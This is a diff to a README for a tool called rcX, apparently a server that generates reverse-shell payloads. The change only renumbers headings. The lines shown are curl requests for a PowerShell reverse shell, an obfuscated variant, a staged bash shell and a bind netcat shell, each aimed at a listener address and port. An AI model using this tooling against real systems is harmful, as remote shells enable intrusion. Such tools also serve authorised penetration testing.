@@ -68,13 +68,13 @@ Use rcX as a server then you can use it with your team or friends.
 ##### 6.Get a Windows powershell reverse shell payload
   `curl http://127.0.0.1/windows/powershell/127.0.0.4/44444`
 
-##### 6.replace_char(obfuscation method) only without using encoder
+##### 7.replace_char(obfuscation method) only without using encoder
   `curl http://127.0.0.1/windows/powershell/127.0.0.4/44444/,/replace_char`
 
-##### 7.Only use staging, without any encoder and obfuscator
+##### 8.Only use staging, without any encoder and obfuscator
   `curl http://127.0.0.1/linux/bash/127.0.0.4/8888/,/,/1/1`
 
-##### 8.Get a bind linux netcat shell payload
+##### 9.Get a bind linux netcat shell payload
   `curl http://127.0.0.1/bind/linux/netcat/127.0.0.4/8888`
 
 
